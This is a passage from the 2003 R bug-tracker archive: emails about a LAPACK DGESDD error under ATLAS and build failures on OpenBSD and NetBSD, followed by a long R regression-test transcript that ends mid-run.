References: <200304221807.h3MI7apD014611@pubhealth.ku.dk>
X-Mailer: VM 7.14 under Emacs 21.2.1
Reply-To: Kurt.Hornik@wu-wien.ac.at
From: Kurt Hornik <hornik@ci.tuwien.ac.at>
X-WU-uvscan-status: clean v4.2.40/v4258 popstar 939ae93a58c73b38bab120ead250ab8f

>>>>> rdiaz  writes:

> Dear All,
> Under Debian GNU/Linux La.svd (with method = "dgesdd") sometimes gives the 
> error

> "Error in La.svd(data, nu = 0, nv = min(nrow, ncol), method = "dgesdd") : 
> 	LAPACK routine DGESDD gave error code -12"

> It seems not to depend on the data per se, but on the relationship between 
> numbers of rows and columns. 

> For example, if the number of columns is 100, La.svd will fail when
> the number of rows is 56, but not if it is 55 or 57. It will not fail
> if we use "dgesvd". If the number of columns is 51, La.svd fails when
> the number of rows is between 29 and 50 if we use "dgesdd".

> This happens if I use the latest deb packages (and thus ATLAS,
> etc). It does not happen if I build R in this same machine with
> "--without-blas" (where make check reports no errors). In case it
> matters, the bug does not show up in a different machine with Windwos
> 2000 and the Rblas.dll linked against ATLAS provided in
> http://cran.r-project.org/bin/windows/contrib/ATLAS/P4).

> I understand this is probably related to the issues mentioned in
> R-admin about LAPACK 3.0 and some of the issues recently discussed in
> this list by M.  Burger, D. Bates and D. Eddelbuettel. Are there any
> workarounds (besides not using ATLAS at all?).

> Ramón

> ********************************
> An example of failure:
>> ## ncol = 100
>> nrow <- 56
>> ncol <- 100
>> data <- matrix(1:(nrow * ncol), ncol = ncol)
>> ## you get the errors if you use any other data
>> ## such as data <- matrix(rnorm(nrow * ncol), ncol = ncol)
>> svd(data) ## error
>> La.svd(data, nu = 0,
>              nv = min(nrow, ncol), method = "dgesdd") ## error
>> La.svd(data, nu = 0,
>              nv = min(nrow, ncol), method = "dgesvd") ## OK

>> ##ncol = 51; it fails with nrow in [29, 50]
> *************************

Confirmed on Debian GNU/Linux testing with atlas2-base-dev for both the
current 1.7.0 debs and 1.8.0 built from scratch using --with-lapack:

hornik@mithrandir:~/tmp$ ldd /usr/local/lib/R/modules/lapack.so 
        libR.so => not found
        liblapack.so.2 => /usr/lib/atlas/liblapack.so.2 (0x40013000)

-k

==> 2823.audit <==
Fri Apr 25 20:07:18 2003	ripley	changed notes
Fri Apr 25 20:07:18 2003	ripley	foobar
Thu May 29 09:51:58 2003	ripley	moved from incoming to System-specific
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2836 *
Subject: R-1.7.0: build feedback: OpenBSD 3.2
From: "Nelson H. F. Beebe" <beebe@math.utah.edu>
Date: Thu, 24 Apr 2003 11:40:35 -0600 (MDT)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2836 <==
From mailnull@stat.math.ethz.ch Thu Apr 24 19:40:47 2003
Received: from hypatia.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h3OHekpD008818
	for <R-bugs@biostat.ku.dk>; Thu, 24 Apr 2003 19:40:47 +0200 (MET DST)
Received: from hypatia.math.ethz.ch (localhost [127.0.0.1])
	by hypatia.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h3OHehbj018287
	(version=TLSv1/SSLv3 cipher=DHE-RSA-AES256-SHA bits=256 verify=NO)
	for <R-bugs@biostat.ku.dk>; Thu, 24 Apr 2003 19:40:44 +0200 (MEST)
Received: (from mailnull@localhost)
	by hypatia.math.ethz.ch (8.12.9/8.12.6/Submit) id h3OHeh4J018286
	for R-bugs@biostat.ku.dk; Thu, 24 Apr 2003 19:40:43 +0200 (MEST)
Received: from franz.stat.wisc.edu (www.omegahat.org [128.105.174.32])
	by hypatia.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h3OHecbi018265
	for <r-bugs@lists.r-project.org>; Thu, 24 Apr 2003 19:40:39 +0200 (MEST)
Received: from sunshine.math.utah.edu ([128.110.198.2] ident=[P4jB9svowineRZeiXlmiwyPtw2TxQ1Uq])
	by franz.stat.wisc.edu with esmtp (Exim 3.35 #1 (Debian))
	id 198ki7-0005DQ-00
	for <r-bugs@r-project.org>; Thu, 24 Apr 2003 12:40:39 -0500
Received: from suncore.math.utah.edu (IDENT:vaj/hT8eYShMPb6CVAVnm2m9Sgdtj+7D@suncore.math.utah.edu [128.110.198.5])
	by sunshine.math.utah.edu (8.9.3p2/8.9.3) with ESMTP id LAA24541;
	Thu, 24 Apr 2003 11:40:35 -0600 (MDT)
Received: (from beebe@localhost)
	by suncore.math.utah.edu (8.9.3p2/8.9.3) id LAA22994;
	Thu, 24 Apr 2003 11:40:35 -0600 (MDT)
Date: Thu, 24 Apr 2003 11:40:35 -0600 (MDT)
From: "Nelson H. F. Beebe" <beebe@math.utah.edu>
To: r-bugs@r-project.org
Cc: beebe@math.utah.edu
X-US-Mail: "Center for Scientific Computing, Department of Mathematics, 110
        LCB, University of Utah, 155 S 1400 E RM 233, Salt Lake City, UT
        84112-0090, USA"
X-Telephone: +1 801 581 5254
X-FAX: +1 801 585 1640, +1 801 581 4148
X-URL: http://www.math.utah.edu/~beebe
Subject: R-1.7.0: build feedback: OpenBSD 3.2
Message-ID: <CMM.0.92.0.1051206035.beebe@suncore.math.utah.edu>
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Spam-Status: No, hits=0.0 required=5.0 tests=none version=2.53
X-Spam-Level: 
X-Spam-Checker-Version: SpamAssassin 2.53 (1.174.2.15-2003-03-30-exp)

R-1.7.0 failed to build on OpenBSD 3.2:

Machinetype:            Intel Pentium III (600 MHz);    OpenBSD 3.2 GENERIC#25 i386
Remote gcc version:     gcc (GCC) 3.2.2
Remote g++ version:     g++ (GCC) 3.2.2
Configure environment:  CC=gcc CXX=g++ LDFLAGS=-Wl,-rpath,/usr/local/lib 

gcc -shared -Wl,-rpath,/usr/local/lib -o lapack.so  Lapack.lo rgeev.lo rsyev.lo  -L../../../bin -lRlapack  -L/usr/lib/debug -L/usr/local/lib/gcc-lib/i386-unknown-openbsd3.2/3.2.2 -L/usr/local/lib/gcc-lib/i386-unknown-openbsd3.2/3.2.2/../../.. -lfrtbegin -lg2c -lm -lbz2 -lz -lreadline -lncurses -lm
ld: -lRlapack: no match
collect2: ld returned 1 exit status
make[4]: *** [lapack.so] Error 1
make[4]: Leaving directory `/local/build/R-1.7.0/src/modules/lapack'

The curious thing is that the library IS present, and should have been
found via the -L path settings:

	% ls -l bin/libRlapack.so 
	-rwxrwxr-x    1 beebe    users     2453767 Apr 24 09:46 bin/libRlapack.so

-------------------------------------------------------------------------------
- Nelson H. F. Beebe                    Tel: +1 801 581 5254                  -
- Center for Scientific Computing       FAX: +1 801 581 4148                  -
- University of Utah                    Internet e-mail: beebe@math.utah.edu  -
- Department of Mathematics, 110 LCB        beebe@acm.org  beebe@computer.org -
- 155 S 1400 E RM 233                       beebe@ieee.org                    -
- Salt Lake City, UT 84112-0090, USA    URL: http://www.math.utah.edu/~beebe  -


==> 2836.audit <==
Fri Apr 25 20:06:48 2003	ripley	moved from incoming to System-specific
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2837 *
Subject: R-1.7.0 build feedback: NetBSD 1.6
From: "Nelson H. F. Beebe" <beebe@math.utah.edu>
Date: Thu, 24 Apr 2003 11:45:20 -0600 (MDT)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2837 <==
From mailnull@stat.math.ethz.ch Thu Apr 24 19:45:34 2003
Received: from hypatia.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h3OHjYpD008850
	for <R-bugs@biostat.ku.dk>; Thu, 24 Apr 2003 19:45:34 +0200 (MET DST)
Received: from hypatia.math.ethz.ch (localhost [127.0.0.1])
	by hypatia.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h3OHjUbj018990
	(version=TLSv1/SSLv3 cipher=DHE-RSA-AES256-SHA bits=256 verify=NO)
	for <R-bugs@biostat.ku.dk>; Thu, 24 Apr 2003 19:45:30 +0200 (MEST)
Received: (from mailnull@localhost)
	by hypatia.math.ethz.ch (8.12.9/8.12.6/Submit) id h3OHjTo7018987
	for R-bugs@biostat.ku.dk; Thu, 24 Apr 2003 19:45:29 +0200 (MEST)
Received: from franz.stat.wisc.edu (www.omegahat.org [128.105.174.32])
	by hypatia.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h3OHjNbi018964
	for <r-bugs@lists.r-project.org>; Thu, 24 Apr 2003 19:45:23 +0200 (MEST)
Received: from sunshine.math.utah.edu ([128.110.198.2] ident=[gMxx9Uii3mR8kpPyHHCLWTMKyfh3qSrQ])
	by franz.stat.wisc.edu with esmtp (Exim 3.35 #1 (Debian))
	id 198kmh-0005Eo-00
	for <r-bugs@r-project.org>; Thu, 24 Apr 2003 12:45:23 -0500
Received: from suncore.math.utah.edu (IDENT:3SnKeLwLN3a70A+VbJ7UZpgXOotTyxom@suncore.math.utah.edu [128.110.198.5])
	by sunshine.math.utah.edu (8.9.3p2/8.9.3) with ESMTP id LAA24834;
	Thu, 24 Apr 2003 11:45:20 -0600 (MDT)
Received: (from beebe@localhost)
	by suncore.math.utah.edu (8.9.3p2/8.9.3) id LAA23043;
	Thu, 24 Apr 2003 11:45:20 -0600 (MDT)
Date: Thu, 24 Apr 2003 11:45:20 -0600 (MDT)
From: "Nelson H. F. Beebe" <beebe@math.utah.edu>
To: r-bugs@r-project.org
Cc: beebe@math.utah.edu
X-US-Mail: "Center for Scientific Computing, Department of Mathematics, 110
        LCB, University of Utah, 155 S 1400 E RM 233, Salt Lake City, UT
        84112-0090, USA"
X-Telephone: +1 801 581 5254
X-FAX: +1 801 585 1640, +1 801 581 4148
X-URL: http://www.math.utah.edu/~beebe
Subject: R-1.7.0 build feedback: NetBSD 1.6
Message-ID: <CMM.0.92.0.1051206320.beebe@suncore.math.utah.edu>
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Spam-Status: No, hits=0.0 required=5.0 tests=none version=2.53
X-Spam-Level: 
X-Spam-Checker-Version: SpamAssassin 2.53 (1.174.2.15-2003-03-30-exp)

R-1.7.0 built on NetBSD 1.6, but the validation test suite failed:

Machinetype:            Intel Pentium III (600 MHz);    NetBSD 1.6 (GENERIC)
Remote gcc version:     gcc (GCC) 3.2.2
Remote g++ version:     g++ (GCC) 3.2.2
Configure environment:  CC=gcc CXX=g++ LDFLAGS=-Wl,-rpath,/usr/local/lib 

make[5]: Entering directory `/local/build/R-1.7.0/src/library'
 >>> Building/Updating help pages for package 'base'
     Formats: text example 
make[5]: Leaving directory `/local/build/R-1.7.0/src/library'
running code in 'base-Ex.R' ...make[4]: *** [base-Ex.Rout] Error 1
make[4]: Leaving directory `/local/build/R-1.7.0/tests/Examples'
make[3]: *** [test-Examples-Base] Error 2
make[3]: Leaving directory `/local/build/R-1.7.0/tests/Examples'
make[2]: *** [test-Examples] Error 2
make[2]: Leaving directory `/local/build/R-1.7.0/tests'

I forced the tests to run with "make -i check", getting output like
this:

running code in 'base-Ex.R' ...make[4]: [base-Ex.Rout] Error 1 (ignored)
 OK
collecting examples for package 'ctest' ...
make[5]: Entering directory `/local/build/R-1.7.0/src/library'
 >>> Building/Updating help pages for package 'ctest'
     Formats: text example
make[5]: Leaving directory `/local/build/R-1.7.0/src/library'
running code in 'ctest-Ex.R' ...make[4]: [ctest-Ex.Rout] Error 1 (ignored)
 OK
...


mv: cannot stat `eval-etc.Rout': No such file or directory
comparing 'eval-etc.Rout' to './eval-etc.Rout.save' ...2a3,158
> > ####  eval / parse / deparse / substitute  etc
> >
> > ##- From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
> > ##- Subject: Re: source() / eval() bug ??? (PR#96)
> > ##- Date: 20 Jan 1999 14:56:24 +0100
> > e1 <- parse(text='c(F=(f <- .3), "Tail area" = 2 * if(f < 1) 30 else 90)')[[1]]
> > e1
> c(F = (f <- 0.3), "Tail area" = 2 * if (f < 1) 30 else 90)
...

This is followed by 9900+ lines of differences.


-------------------------------------------------------------------------------
- Nelson H. F. Beebe                    Tel: +1 801 581 5254                  -
- Center for Scientific Computing       FAX: +1 801 581 4148                  -
- University of Utah                    Internet e-mail: beebe@math.utah.edu  -
- Department of Mathematics, 110 LCB        beebe@acm.org  beebe@computer.org -
- 155 S 1400 E RM 233                       beebe@ieee.org                    -
- Salt Lake City, UT 84112-0090, USA    URL: http://www.math.utah.edu/~beebe  -


==> 2837.audit <==
Fri Apr 25 20:06:48 2003	ripley	moved from incoming to System-specific

==> 2837.followup.1 <==
From mailnull@stat.math.ethz.ch Sat May  3 16:10:04 2003
Received: from hypatia.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h43EA22b001234
	for <R-bugs@biostat.ku.dk>; Sat, 3 May 2003 16:10:03 +0200 (MET DST)
Received: from hypatia.math.ethz.ch (localhost [127.0.0.1])
	by hypatia.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h43E9xVn011233
	(version=TLSv1/SSLv3 cipher=DHE-RSA-AES256-SHA bits=256 verify=NO)
	for <R-bugs@biostat.ku.dk>; Sat, 3 May 2003 16:09:59 +0200 (MEST)
Received: (from mailnull@localhost)
	by hypatia.math.ethz.ch (8.12.9/8.12.6/Submit) id h43E9wbO011232
	for R-bugs@biostat.ku.dk; Sat, 3 May 2003 16:09:58 +0200 (MEST)
Received: from franz.stat.wisc.edu (www.omegahat.org [128.105.174.32])
	by hypatia.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h43E9VVm011198
	for <r-bugs@lists.r-project.org>; Sat, 3 May 2003 16:09:32 +0200 (MEST)
Received: from sunshine.math.utah.edu ([128.110.198.2] ident=[Kpx5BwJHYia4N37oBuUTfF8HhFza1/sF])
	by franz.stat.wisc.edu with esmtp (Exim 3.35 #1 (Debian))
	id 19Bxhj-0002R6-00
	for <r-bugs@r-project.org>; Sat, 03 May 2003 09:09:31 -0500
Received: from suncore.math.utah.edu (IDENT:yFZdZiQeoEEvzYCyNJPCA467qCeS9Lcs@suncore.math.utah.edu [128.110.198.5])
	by sunshine.math.utah.edu (8.9.3p2/8.9.3) with ESMTP id IAA23131;
	Sat, 3 May 2003 08:09:29 -0600 (MDT)
Received: (from beebe@localhost)
	by suncore.math.utah.edu (8.9.3p2/8.9.3) id IAA13683;
	Sat, 3 May 2003 08:09:28 -0600 (MDT)
Date: Sat, 3 May 2003 08:09:28 -0600 (MDT)
From: "Nelson H. F. Beebe" <beebe@math.utah.edu>
To: Kurt.Hornik@wu-wien.ac.at
Cc: beebe@math.utah.edu, r-bugs@r-project.org
X-US-Mail: "Center for Scientific Computing, Department of Mathematics, 110
        LCB, University of Utah, 155 S 1400 E RM 233, Salt Lake City, UT
        84112-0090, USA"
X-Telephone: +1 801 581 5254
X-FAX: +1 801 585 1640, +1 801 581 4148
X-URL: http://www.math.utah.edu/~beebe
Subject: Re: [Rd] R-1.7.0 build feedback: NetBSD 1.6 (PR#2837)
In-Reply-To: Your message of Fri, 2 May 2003 21:43:26 +0200
Message-ID: <CMM.0.92.0.1051970968.beebe@suncore.math.utah.edu>
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
Content-Transfer-Encoding: 8bit
X-Spam-Status: No, hits=-7.1 required=5.0 tests=IN_REP_TO,QUOTED_EMAIL_TEXT,QUOTE_TWICE_1 version=2.53
X-Spam-Level: 
X-Spam-Checker-Version: SpamAssassin 2.53 (1.174.2.15-2003-03-30-exp)

This is a followup to my report of a SIGSEGV in R-1.7.0 built
on NetBSD 1.6.

Kurt Hornik responded:

>> ...
>> After some discussions on r-core, two suggestions.
>>
>> * It might be helpful to know if zlib has found in the OS or compiled
>>   from the sources within R: if the first you could try configure
>>   --without-zlib as it is possible the OS has a modified version.
>>
>> * You have
>>
>>   R : Copyright 2003, The R Development Core Team
>>   Version 1.7.0 Under development (unstable) (2003-04-11)
>>                       ^^^^^^^^^^^^^^^^^^^^^^         ^^^
>>
>>   and might just have hit a bad day of the r-devel daily snapshot.
>> ...

I don't think that the latter is the problem.  This version built,
validated, and installed on several other platforms.

Since my initial bug report for this system, I upgraded the gcc
release from 3.2.2 to the latest 3.2.3, so the compilation environment
is now a bit different.

I tried your suggestion of the --without-zlib configure option, and
that produced a working R, which I've installed.  There was one *.fail
file in the tests directory: reg-tests-1.Rout.fail.  It is 2280 lines
long, and contains a fair number of "Error xxx" reports.

In view of the gcc upgrade, I'm going to go back now and do a fresh
build, and see if the zlib problem recurs.

Here is a copy of reg-tests-1.Rout.fail:

R : Copyright 2003, The R Development Core Team
Version 1.7.0 Under development (unstable) (2003-04-11)

R is free software and comes with ABSOLUTELY NO WARRANTY.
You are welcome to redistribute it under certain conditions.
Type `license()' or `licence()' for distribution details.

R is a collaborative project with many contributors.
Type `contributors()' for more information.

Type `demo()' for some demos, `help()' for on-line help, or
`help.start()' for a HTML browser interface to help.
Type `q()' to quit R.

> ## regression test for PR#376
> aggregate(ts(1:20), nfreq=1/3)
Time Series:
Start = 1
End = 16
Frequency = 0.333333333333333
[1]  6 15 24 33 42 51
> ## Comments: moved from aggregate.Rd
>
>
> ## aperm
> # check the names
> x <- array(1:24, c(4, 6))
> nms <- list(happy=letters[1:4], sad=LETTERS[1:6])
>
> dimnames(x) <- nms
> tmp <- aperm(x, c(2, 1))
> stopifnot(all.equal(dimnames(tmp), nms[c(2, 1)]))
>
> dimnames(x) <- c(nms[1], list(NULL))
> tmp <- aperm(x, c(2, 1))
> stopifnot(all.equal(dimnames(tmp), c(list(NULL), nms[1])))
>
> names(nms) <- c("happy", "sad")
> dimnames(x) <- nms
> tmp <- aperm(x, c(2, 1))
> stopifnot(all.equal(names(dimnames(tmp)), names(nms[c(2, 1)])))
>
> dimnames(x) <- c(nms[1], list(NULL))
> tmp <- aperm(x, c(2, 1))
> stopifnot(all.equal(names(dimnames(tmp)), c("", names(nms)[1])))
>
> # check resize
> stopifnot(dim(aperm(x, c(2, 1), FALSE)) == dim(x))
> stopifnot(is.null(dimnames(aperm(x, c(2, 1), FALSE))))
>
> # check the types
> x <- array(1:24, c(4, 6))
> stopifnot(all.equal(aperm(x, c(2, 1)), t(x)))
> stopifnot(is.integer(aperm(x, c(2, 1))))
>
> x <- x + 0.0
> stopifnot(all.equal(aperm(x, c(2, 1)), t(x)))
> stopifnot(is.double(aperm(x, c(2, 1))))
>
> x <- x + 0.0i
> stopifnot(all.equal(aperm(x, c(2, 1)), t(x)))
>
> x[] <- LETTERS[1:24]
> stopifnot(all.equal(aperm(x, c(2, 1)), t(x)))
>
> x <- array(list("fred"), c(4, 6))
> x[[3, 4]] <- 1:10
> stopifnot(all.equal(aperm(x, c(2, 1)), t(x)))
> ## end of moved from aperm.Rd
>
>
> ## append
> stopifnot(append(1:5, 0:1, after=3) == append(1:3, c(0:1, 4:5)))
> ## end of moved from append.Rd
>
>
> ## as.POSIXlt
> z <- Sys.time()
> stopifnot(range(z) == z,
+ 	  min(z) == z,
+ 	  max(z) == z,
+ 	  mean(z) == z)
> ## end of moved from as.POSIXlt.Rd
>
>
> ## autoload
> stopifnot(ls("Autoloads") == ls(envir = .AutoloadEnv))
> ## end of moved from autoload.Rd
>
>
> ## backsolve
> r <- rbind(c(1,2,3),
+ 	   c(0,1,1),
+ 	   c(0,0,2))
> ( y <- backsolve(r, x <- c(8,4,2)) ) # -1 3 1
[1] -1  3  1
> r %*% y # == x = (8,4,2)
     [,1]
[1,]    8
[2,]    4
[3,]    2
> ( y2 <- backsolve(r, x, transpose = TRUE)) # 8 -12 -5
[1]   8 -12  -5
> stopifnot(all.equal(drop(t(r) %*% y2), x))
> stopifnot(all.equal(y, backsolve(t(r), x, upper = FALSE, transpose = TRUE)))
> stopifnot(all.equal(y2, backsolve(t(r), x, upper = FALSE, transpose = FALSE)))
> ## end of moved from backsolve.Rd
>
>
> ## basename
> dirname(character(0))
character(0)
> ## end of moved from basename.Rd
>
>
> ## Bessel
> ## Check the Scaling :
> nus <- c(0:5,10,20)
> x <- seq(0,40,len=801)[-1]
> for(nu in nus)
+    stopifnot(abs(1- besselK(x,nu)*exp( x) / besselK(x,nu,expo=TRUE)) < 2e-15)
> for(nu in nus)
+    stopifnot(abs(1- besselI(x,nu)*exp(-x) / besselI(x,nu,expo=TRUE)) < 1e-15)
> ## end of moved from Bessel.Rd
>
>
> ## c
> ll <- list(A = 1, c="C")
> stopifnot(identical(c(ll, d=1:3), c(ll, as.list(c(d=1:3)))))
> ## moved from c.Rd
>
>
> ## Cauchy
> stopifnot(all.equal(dcauchy(-1:4), 1 / (pi*(1 + (-1:4)^2))))
> ## end of moved from Cauchy.Rd
>
>
> ## chol
> ( m <- matrix(c(5,1,1,3),2,2) )
     [,1] [,2]
[1,]    5    1
[2,]    1    3
> ( cm <- chol(m) )
         [,1]      [,2]
[1,] 2.236068 0.4472136
[2,] 0.000000 1.6733201
> stopifnot(abs(m	 -  t(cm) %*% cm) < 100* .Machine$double.eps)
> ( Lcm <- La.chol(m) )
         [,1]      [,2]
[1,] 2.236068 0.4472136
[2,] 0.000000 1.6733201
> stopifnot(abs(m - crossprod(Lcm))  < 100* .Machine$double.eps)
>
> ## check with pivoting
> ( m <- matrix(c(5,1,1,3),2,2) )
     [,1] [,2]
[1,]    5    1
[2,]    1    3
> ( cm <- chol(m, TRUE) )
         [,1]      [,2]
[1,] 2.236068 0.4472136
[2,] 0.000000 1.6733201
attr(,"pivot")
[1] 1 2
attr(,"rank")
[1] 2
> stopifnot(abs(m	 -  t(cm) %*% cm) < 100* .Machine$double.eps)
>
> x <- matrix(c(1:5, (1:5)^2), 5, 2)
> m <- crossprod(x)
> Q <- chol(m)
> stopifnot(all.equal(t(Q) %*% Q, m))
>
> Q <- chol(m, pivot = TRUE)
> pivot <- attr(Q, "pivot")
> oo <- order(pivot)
> stopifnot(all.equal(t(Q[, oo]) %*% Q[, oo], m))
> stopifnot(all.equal(t(Q) %*% Q, m[pivot, pivot]))
>
> # now for something positive semi-definite
> x <- cbind(x, x[, 1]+3*x[, 2])
> m <- crossprod(x)
> qr(m)$rank # is 2, as it should be
[1] 2
>
> (Q <- chol(m, pivot = TRUE)) # NB wrong rank here ... see Warning section.
         [,1]     [,2]          [,3]
[1,] 101.0742 7.222415  3.128394e+01
[2,]   0.0000 1.684259 -5.614195e-01
[3,]   0.0000 0.000000  1.010646e-07
attr(,"pivot")
[1] 3 1 2
attr(,"rank")
[1] 3
> pivot <- attr(Q, "pivot")
> oo <- order(pivot)
> stopifnot(all.equal(t(Q[, oo]) %*% Q[, oo], m))
> stopifnot(all.equal(t(Q) %*% Q, m[pivot, pivot]))
> ## end of moved from chol.Rd
>
>
> ## chol2inv
> cma <- chol(ma	<- cbind(1, 1:3, c(1,3,7)))
> stopifnot(all.equal(diag(3), ma %*% chol2inv(cma)))
> stopifnot(all.equal(diag(3), ma %*% La.chol2inv(cma)))
> ## end of moved from chol2inv.Rd
>
>
> ## col2rgb
> pp <- palette(); names(pp) <- pp # add & use names :
> stopifnot(col2rgb(1:8) == print(col2rgb(pp)))
      black red green3 blue cyan magenta yellow gray
red       0 255      0    0    0     255    255  190
green     0   0    205    0  255       0    255  190
blue      0   0      0  255  255     255      0  190
> stopifnot(col2rgb("#08a0ff") == c(8, 160, 255))
> grC <- col2rgb(paste("gray",0:100,sep=""))
> stopifnot(grC["red",] == grC["green",],
+ 	  grC["red",] == grC["blue",],
+ 	  grC["red", 1:4] == c(0,3,5,8))
> ## end of moved from col2rgb.Rd
>
>
> ## complex
> z <- 0i ^ (-3:3)
> stopifnot(Re(z) == 0 ^ (-3:3))
> set.seed(123)
> z <- complex(real = rnorm(100), imag = rnorm(100))
> stopifnot(Mod ( 1 -  sin(z) / ( (exp(1i*z)-exp(-1i*z))/(2*1i) ))
+ 	  < 20 * .Machine$double.eps)
> ## end of moved from complex.Rd
>
>
> ## Constants
> stopifnot(
+  nchar(letters) == 1,
+  month.abb == substr(month.name, 1, 3)
+ )
>
> eps <- .Machine$double.eps
> stopifnot(all.equal(pi, 4*atan(1), tol= 2*eps))
>
> # John Machin (1705) computed 100 decimals of pi :
> stopifnot(all.equal(pi/4, 4*atan(1/5) - atan(1/239), 4*eps))
> ## end of moved from Constants.Rd
>
>
> ## cor
> stopifnot(  is.na(var(1)),
+ 	  !is.nan(var(1)))
>
> zz <- c(-1.30167, -0.4957, -1.46749, 0.46927)
> r <- cor(zz,zz); r - 1
[1] 0
> stopifnot(r <= 1) # fails in R <= 1.3.x, for versions of Linux and Solaris
> ## end of moved from cor.Rd
>
>
> ## DateTimeClasses
> (dls <- .leap.seconds[-1] - .leap.seconds[-22])
Time differences of 184, 365, 365, 365, 366, 365, 365, 365, 547, 730, 731, 365, 549, 731, 365, 547, 365, 365, 549, 547, 549 days
> table(dls)
dls
184 365 366 547 549 730 731
  1  10   1   3   3   1   2
> ## end of moved from DateTimeClasses.Rd
>
>
> ## deriv
> trig.exp <- expression(sin(cos(x + y^2)))
> D.sc <- D(trig.exp, "x")
> dxy <- deriv(trig.exp, c("x", "y"))
> y <- 1
> stopifnot(eval(D.sc) ==
+ 	  attr(eval(dxy),"gradient")[,"x"])
> ff <- y ~ sin(cos(x) * y)
> stopifnot(all.equal(deriv(ff, c("x","y"), func = TRUE ),
+ 		    deriv(ff, c("x","y"), func = function(x,y){ } )))
> ## end of moved from deriv.Rd
>
>
> ## diff
> x <- cumsum(cumsum(1:10))
> stopifnot(diff(x, lag = 2) == x[(1+2):10] - x[1:(10 - 2)],
+ 	  diff(x, lag = 2) == (3:10)^2,
+ 	  diff(diff(x))	   == diff(x, differences = 2))
> ## end of moved from diff.Rd
>
>
> ## duplicated
> x <- c(9:20, 1:5, 3:7, 0:8)
> ## extract unique elements
> (xu <- x[!duplicated(x)])
 [1]  9 10 11 12 13 14 15 16 17 18 19 20  1  2  3  4  5  6  7  0  8
> stopifnot(xu == unique(x), # but unique(x) is more efficient
+ 	  0:20 == sort(x[!duplicated(x)]))
>
> data(iris)
> stopifnot(duplicated(iris)[143] == TRUE)
> ## end of moved from duplicated.Rd
>
>
> ## eigen
> Meps <- .Machine$double.eps
> set.seed(321, kind = "default")	 # force a particular seed
> m <- matrix(round(rnorm(25),3), 5,5)
> sm <- m + t(m) #- symmetric matrix
> em <- eigen(sm); V <- em$vect
> print(lam <- em$values) # ordered DEcreasingly
[1]  5.1738946  3.1585064  0.6849974 -1.6299494 -2.5074489
>
> stopifnot(
+  abs(sm %*% V - V %*% diag(lam))	  < 60*Meps,
+  abs(sm	      - V %*% diag(lam) %*% t(V)) < 60*Meps)
>
> ##------- Symmetric = FALSE:  -- different to above : ---
>
> em <- eigen(sm, symmetric = FALSE); V2 <- em$vect
> print(lam2 <- em$values) # ordered decreasingly in ABSolute value !
[1]  5.1738946  3.1585064 -2.5074489 -1.6299494  0.6849974
> print(i <- rev(order(lam2)))
[1] 1 2 5 4 3
> stopifnot(abs(lam - lam2[i]) < 60 * Meps)
>
> zapsmall(Diag <- t(V2) %*% V2)
     [,1] [,2] [,3] [,4] [,5]
[1,]    1    0    0    0    0
[2,]    0    1    0    0    0
[3,]    0    0    1    0    0
[4,]    0    0    0    1    0
[5,]    0    0    0    0    1
> stopifnot( abs(1- diag(Diag)) < 60*Meps)
>
> stopifnot(abs(sm %*% V2 - V2 %*% diag(lam2))		< 60*Meps,
+ 	  abs(sm	 - V2 %*% diag(lam2) %*% t(V2)) < 60*Meps)
>
> ## Re-ordered as with symmetric:
> sV <- V2[,i]
> slam <- lam2[i]
> stopifnot(abs(sm %*% sV -  sV %*% diag(slam))		  < 60*Meps)
> stopifnot(abs(sm	-  sV %*% diag(slam) %*% t(sV)) < 60*Meps)
> ## sV  *is* now equal to V  -- up to sign (+-) and rounding errors
> stopifnot(abs(c(1 - abs(sV / V)))	<     1000*Meps)
> ## end of moved from eigen.Rd
>
>
> ## euro
> data(euro)
> stopifnot(euro == signif(euro,6), euro.cross == outer(1/euro, euro))
> ## end of moved from euro.Rd
>
>
> ## Exponential
> r <- rexp(100)
> stopifnot(abs(1 - dexp(1, r) / (r*exp(-r))) < 1e-14)
> ## end of moved from Exponential.Rd
>
>
> ## family
> gf <- Gamma()
> stopifnot(1:10 == gf$linkfun(gf$linkinv(1:10)))
> ## end of moved from family.Rd
>
>
> ## fft
> set.seed(123)
> eps <- 1e-11
> for(N in 1:130) {
+     x <- rnorm(N)
+     if(N %% 5 == 0) {
+ 	m5 <- matrix(x,ncol=5)
+ 	stopifnot(apply(m5,2,fft) == mvfft(m5))
+     }
+     dd <- Mod(1 - (f2 <- fft(fft(x), inverse=TRUE)/(x*length(x))))
+     stopifnot(dd < eps)
+ }
> ## end of moved from fft.Rd
>
>
> ## findint
> N <- 100
> X <- sort(round(rt(N, df=2), 2))
> tt <- c(-100, seq(-2,2, len=201), +100)
> it <- findInterval(tt, X)
>
> ## See that this is N * Fn(.) :
> tt <- c(tt,X)
> eps <- 100 * .Machine$double.eps
> require(stepfun)
Loading required package: stepfun
[1] TRUE
> stopifnot(it[c(1,203)] == c(0, 100),
+ 	  all.equal(N * ecdf(X)(tt),
+ 		    findInterval(tt, X),  tol = eps),
+ 	  findInterval(tt,X) ==	 apply( outer(tt, X, ">="), 1, sum)
+ 	  )
> ## end of moved from findint.Rd
>
>
> ## format
